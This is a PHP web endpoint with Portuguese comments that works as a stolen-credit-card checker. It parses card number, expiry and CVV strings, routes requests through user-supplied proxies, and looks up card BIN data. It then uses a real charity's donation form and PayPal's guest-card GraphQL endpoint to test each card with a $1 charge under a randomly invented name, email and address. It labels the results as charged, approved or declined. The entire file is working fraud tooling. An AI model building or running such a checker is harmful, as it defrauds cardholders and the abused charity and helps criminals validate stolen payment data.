<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Classe Session com suporte a proxy
class Session {
    private $cookies = [];
    private $proxy = null;
    
    public function setProxy($proxy) {
        $this->proxy = $proxy;
    }
    
    public function get($url, $headers = []) {
        return $this->request('GET', $url, null, $headers);
    }
    
    public function post($url, $data = null, $headers = [], $isJson = false) {
        return $this->request('POST', $url, $data, $headers, $isJson);
    }
    
    private function request($method, $url, $data = null, $headers = [], $isJson = false) {
        $ch = curl_init();
        
        $defaultHeaders = [
            'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.1 Mobile Safari/537.36'
        ];
        
        if (!empty($this->cookies)) {
            $cookieStr = '';
            foreach ($this->cookies as $key => $value) {
                $cookieStr .= "$key=$value; ";
            }
            $defaultHeaders[] = 'Cookie: ' . trim($cookieStr, '; ');
        }
        
        $allHeaders = array_merge($defaultHeaders, $headers);
        
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $allHeaders);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        
        // Configurar proxy se existir
        if ($this->proxy) {
            $proxyParts = explode(':', $this->proxy);
            if (count($proxyParts) >= 2) {
                $proxyIp = $proxyParts[0];
                $proxyPort = $proxyParts[1];
                curl_setopt($ch, CURLOPT_PROXY, $proxyIp);
                curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
                
                if (count($proxyParts) >= 4) {
                    $proxyUser = $proxyParts[2];
                    $proxyPass = $proxyParts[3];
                    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUser:$proxyPass");
                }
            }
        }
        
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            if ($data !== null) {
                if ($isJson) {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
                } else {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                }
            }
        }
        
        $response = curl_exec($ch);
        $error = curl_error($ch);
        
        preg_match_all('/Set-Cookie:\s*([^;]+)/i', $response, $matches);
        foreach ($matches[1] as $match) {
            $parts = explode('=', $match, 2);
            if (count($parts) === 2) {
                $this->cookies[$parts[0]] = $parts[1];
            }
        }
        
        curl_close($ch);
        
        if ($error) {
            return ['text' => '', 'error' => $error];
        }
        
        return ['text' => $response];
    }
}

// Função para testar proxy
function testProxy($proxy) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://httpbin.org/ip');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $proxyParts = explode(':', $proxy);
    if (count($proxyParts) >= 2) {
        curl_setopt($ch, CURLOPT_PROXY, $proxyParts[0]);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxyParts[1]);
        if (count($proxyParts) >= 4) {
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyParts[2] . ':' . $proxyParts[3]);
        }
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($httpCode == 200 && $response);
}

// Função para buscar informações do BIN
function getBinInfo($bin) {
    $bin = substr(preg_replace('/[^0-9]/', '', $bin), 0, 6);
    $url = "https://bins.antipublic.cc/bins/{$bin}";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $countryFlags = [
        'US' => '🇺🇸', 'GB' => '🇬🇧', 'CA' => '🇨🇦', 'AU' => '🇦🇺', 'BR' => '🇧🇷',
        'PT' => '🇵🇹', 'ES' => '🇪🇸', 'FR' => '🇫🇷', 'DE' => '🇩🇪', 'IT' => '🇮🇹'
    ];
    
    if ($httpCode == 200 && $response) {
        $data = json_decode($response, true);
        if ($data) {
            $countryCode = $data['country_code'] ?? 'US';
            $flag = $countryFlags[$countryCode] ?? '🌍';
            
            return [
                'brand' => $data['brand'] ?? 'Unknown',
                'bank' => $data['bank'] ?? 'Unknown',
                'country' => $data['country_name'] ?? 'Unknown',
                'country_flag' => $flag,
                'level' => $data['level'] ?? 'Standard',
                'type' => $data['type'] ?? 'Credit'
            ];
        }
    }
    
    return [
        'brand' => 'Unknown',
        'bank' => 'Unknown',
        'country' => 'Unknown',
        'country_flag' => '🌍',
        'level' => 'Standard',
        'type' => 'Credit'
    ];
}

// Parse do cartão
function parseCardFromString($cardString) {
    $cardString = trim($cardString);
    $separators = ['|', ':', ';', ',', '/', '-', '_', '.'];
    
    foreach ($separators as $sep) {
        if (strpos($cardString, $sep) !== false) {
            $parts = explode($sep, $cardString);
            if (count($parts) >= 4) {
                $year = $parts[2];
                if (strlen($year) == 2) {
                    $year = ($year >= date('y')) ? '20' . $year : '20' . $year;
                }
                return [
                    'number' => preg_replace('/[^0-9]/', '', $parts[0]),
                    'month' => str_pad(preg_replace('/[^0-9]/', '', $parts[1]), 2, '0', STR_PAD_LEFT),
                    'year' => $year,
                    'cvv' => preg_replace('/[^0-9]/', '', $parts[3])
                ];
            }
        }
    }
    return null;
}

// Análise da resposta COMPLETA
function analyzeResponse($responseText) {
    $last = $responseText;
    
    if (strpos($last, 'ADD_SHIPPING_ERROR') !== false || 
        strpos($last, 'NEED_CREDIT_CARD') !== false || 
        strpos($last, '"status": "succeeded"') !== false || 
        strpos($last, 'Thank You For Donation.') !== false || 
        strpos($last, 'Your payment has already been processed') !== false || 
        strpos($last, 'Success ') !== false) {
        return 'CHARGE 2$ ✅|Charged successfully';
    }
    
    if (strpos($last, 'is3DSecureRequired') !== false || strpos($last, 'OTP') !== false) {
        return 'Approve ❎|3DS Required';
    }
    
    if (strpos($last, 'INVALID_SECURITY_CODE') !== false) {
        return 'APPROVED CCN ✅|INVALID_SECURITY_CODE';
    }
    
    if (strpos($last, 'INVALID_BILLING_ADDRESS') !== false) {
        return 'APPROVED - AVS ✅|INVALID_BILLING_ADDRESS';
    }
    
    if (strpos($last, 'EXISTING_ACCOUNT_RESTRICTED') !== false) {
        return 'APPROVED ✅|EXISTING_ACCOUNT_RESTRICTED';
    }
    
    $responseJson = json_decode($responseText, true);
    if ($responseJson && isset($responseJson['errors']) && count($responseJson['errors']) > 0) {
        $message = $responseJson['errors'][0]['message'] ?? 'Unknown error';
        if (isset($responseJson['errors'][0]['data']) && count($responseJson['errors'][0]['data']) > 0) {
            $code = $responseJson['errors'][0]['data'][0]['code'] ?? 'NO_CODE';
            return "DECLINED ❌|$code";
        }
        return "DECLINED ❌|$message";
    }
    
    return "DECLINED ❌|" . substr(preg_replace('/\s+/', ' ', $responseText), 0, 200);
}

function buildMultipartData($data) {
    $boundary = uniqid();
    $delimiter = '-------------' . $boundary;
    $body = "";
    
    foreach ($data as $name => $value) {
        $body .= "--" . $delimiter . "\r\n";
        $body .= 'Content-Disposition: form-data; name="' . $name . '"' . "\r\n\r\n";
        $body .= $value . "\r\n";
    }
    
    $body .= "--" . $delimiter . "--\r\n";
    return ['body' => $body, 'boundary' => $delimiter];
}

// Função principal de checkout
function processCheckout($card, $binInfo, $proxy = null) {
    $r = new Session();
    if ($proxy) {
        $r->setProxy($proxy);
    }
    
    // Dados aleatórios
    $nomes = ["Liam", "Noah", "Oliver", "Elijah", "James", "William", "Benjamin", "Lucas", "Henry", 
         "Alexander", "Michael", "Daniel", "Matthew", "Joseph", "David", "Samuel", "John", "Ethan",
         "Jacob", "Logan", "Jackson", "Sebastian", "Jack", "Aiden", "Owen", "Leo", "Wyatt", "Jayden",
         "Gabriel", "Carter", "Luke", "Grayson", "Isaac", "Lincoln", "Mason", "Theodore", "Ryan",
         "Nathan", "Andrew", "Joshua", "Thomas", "Charles", "Caleb", "Christian", "Hunter", "Jonathan"];

    $apelidos = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez",
            "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Thompson",
            "White", "Lee", "Perez", "Harris", "Clark", "Lewis", "Robinson", "Walker", "Young", "Allen",
            "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green", "Adams", "Nelson"];

    $codigos_postais = [
        '10001', '10002', '10003', '10004', '10005', '10006', '10007', '10009', '10010',
        '10011', '10012', '10013', '10014', '10016', '10017', '10018', '10019', '10021',
        '10022', '10023', '10024', '10025', '10026', '10027', '10028', '10029'
    ];

    $nome = $nomes[array_rand($nomes)];
    $apelido = $apelidos[array_rand($apelidos)];
    $postal = $codigos_postais[array_rand($codigos_postais)];
    $email = strtolower($nome) . strtolower($apelido) . rand(10, 999) . '@gmail.com';
    $phone = '2012583467';

    // Passo 1: Pegar hash
    $response = $r->get('https://awwatersheds.org/donate/');
    if (isset($response['error'])) {
        return ['error' => 'Failed to connect: ' . $response['error'], 'full_response' => $response['error']];
    }
    
    preg_match('/name="give-form-hash" value="(.*?)"/', $response['text'], $matches);
    $hash = $matches[1] ?? '';

    if (!$hash) {
        return ['error' => 'Failed to get hash', 'full_response' => substr($response['text'], 0, 500)];
    }

    // Passo 2: POST completo da doação
    $postData = [
        'give-honeypot' => '',
        'give-form-id-prefix' => '4572-1',
        'give-form-id' => '4572',
        'give-form-title' => 'Donate Now',
        'give-current-url' => 'https://awwatersheds.org/donate/',
        'give-form-url' => 'https://awwatersheds.org/donate/',
        'give-form-minimum' => '1',
        'give-form-maximum' => '1000000',
        'give-form-hash' => $hash,
        'give-price-id' => 'custom',
        'give-recurring-logged-in-only' => '',
        'give-logged-in-only' => '1',
        'give_recurring_donation_details' => '{"is_recurring":false}',
        'give-amount' => '1',
        'payment-mode' => 'paypal-commerce',
        'give_first' => $nome,
        'give_last' => $apelido,
        'give_email' => $email,
        'give_comment' => '',
        'give_lake_affiliation' => 'Balch Lake',
        'give_lake_affiliation_other' => '',
        'card_exp_month' => '',
        'card_exp_year' => '',
        'give_action' => 'purchase',
        'give-gateway' => 'paypal-commerce',
        'action' => 'give_process_donation',
        'give_ajax' => 'true'
    ];

    $multipart = buildMultipartData($postData);
    $headers = ['Content-Type: multipart/form-data; boundary=' . $multipart['boundary']];
    $response2 = $r->post('https://awwatersheds.org/wp-admin/admin-ajax.php', $multipart['body'], $headers);

    // Passo 3: Criar ordem PayPal
    $postData2 = [
        'give-honeypot' => '',
        'give-form-id-prefix' => '4572-1',
        'give-form-id' => '4572',
        'give-form-title' => 'Donate Now',
        'give-current-url' => 'https://awwatersheds.org/donate/',
        'give-form-url' => 'https://awwatersheds.org/donate/',
        'give-form-minimum' => '1',
        'give-form-maximum' => '1000000',
        'give-form-hash' => $hash,
        'give-price-id' => 'custom',
        'give-recurring-logged-in-only' => '',
        'give-logged-in-only' => '1',
        'give_recurring_donation_details' => '{"is_recurring":false}',
        'give-amount' => '1',
        'payment-mode' => 'paypal-commerce',
        'give_first' => $nome,
        'give_last' => $apelido,
        'give_email' => $email,
        'give_comment' => '',
        'give_lake_affiliation' => 'Balch Lake',
        'give_lake_affiliation_other' => '',
        'card_exp_month' => '',
        'card_exp_year' => '',
        'give-gateway' => 'paypal-commerce'
    ];

    $multipart2 = buildMultipartData($postData2);
    $headers2 = ['Content-Type: multipart/form-data; boundary=' . $multipart2['boundary']];
    $url = 'https://awwatersheds.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order';
    $response3 = $r->post($url, $multipart2['body'], $headers2);
    $data = json_decode($response3['text'], true);
    $token = $data['data']['id'] ?? '';

    if (!$token) {
        return ['error' => 'Failed to create order', 'full_response' => substr($response3['text'], 0, 500)];
    }

    // Passo 4: Processar pagamento
    $json_data = [
        'query' => '
            mutation payWithCard(
                $token: String!
                $card: CardInput
                $paymentToken: String
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
                $identityDocument: IdentityDocumentInput
                $feeReferenceId: String
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    paymentToken: $paymentToken
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                    identityDocument: $identityDocument
                    feeReferenceId: $feeReferenceId
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                        buyer {
                            userId
                            auth {
                                accessToken
                            }
                        }
                        returnUrl {
                            href
                        }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                            parameter
                        }
                    }
                }
            }
        ',
        'variables' => [
            'token' => $token,
            'card' => [
                'cardNumber' => $card['number'],
                'type' => substr($card['number'], 0, 1) == '4' ? 'VISA' : 'MASTERCARD',
                'expirationDate' => $card['month'] . '/' . $card['year'],
                'postalCode' => $postal,
                'securityCode' => $card['cvv']
            ],
            'phoneNumber' => $phone,
            'firstName' => $nome,
            'lastName' => $apelido,
            'billingAddress' => [
                'givenName' => $nome,
                'familyName' => $apelido,
                'state' => 'NY',
                'country' => 'US',
                'line1' => '41W 13th street ',
                'city' => 'New York ',
                'postalCode' => $postal
            ],
            'shippingAddress' => [
                'givenName' => $nome,
                'familyName' => $apelido,
                'state' => 'NY',
                'country' => 'US',
                'line1' => '41W 13th street ',
                'city' => 'New York ',
                'postalCode' => $postal
            ],
            'email' => $email,
            'currencyConversionType' => 'PAYPAL'
        ],
        'operationName' => 'payWithCard'
    ];

    $paypalHeaders = [
        'accept: */*',
        'accept-language: pt-PT',
        'content-type: application/json',
        'origin: https://www.paypal.com',
        'referer: https://www.paypal.com/'
    ];

    $response4 = $r->post('https://www.paypal.com/graphql?paywithcard', $json_data, $paypalHeaders, true);
    $resultado = analyzeResponse($response4['text']);
    
    return [
        'result' => $resultado,
        'full_response' => substr(preg_replace('/\s+/', ' ', $response4['text']), 0, 500)
    ];
}

// ==================== PROCESSAMENTO ====================
$input = json_decode(file_get_contents('php://input'), true);
$action = $input['action'] ?? '';

// Testar proxy
if ($action === 'test_proxy') {
    $proxy = $input['proxy'] ?? '';
    if ($proxy && testProxy($proxy)) {
        echo json_encode(['status' => 'working', 'proxy' => $proxy]);
    } else {
        echo json_encode(['status' => 'failed', 'proxy' => $proxy]);
    }
    exit;
}

// Checkout normal
$cardString = $input['card'] ?? '';
$proxy = $input['proxy'] ?? null;

if (!$cardString) {
    echo json_encode(['error' => 'No card provided']);
    exit;
}

$card = parseCardFromString($cardString);
if (!$card) {
    echo json_encode(['error' => 'Invalid card format']);
    exit;
}

$binInfo = getBinInfo($card['number']);
$result = processCheckout($card, $binInfo, $proxy);

echo json_encode([
    'card' => $card['number'],
    'card_full' => $card['number'],
    'bin' => substr($card['number'], 0, 6),
    'result' => $result['result'] ?? 'ERROR',
    'full_response' => $result['full_response'] ?? 'No response',
    'bin_info' => $binInfo,
    'exp' => $card['month'] . '/' . $card['year']
]);
?>
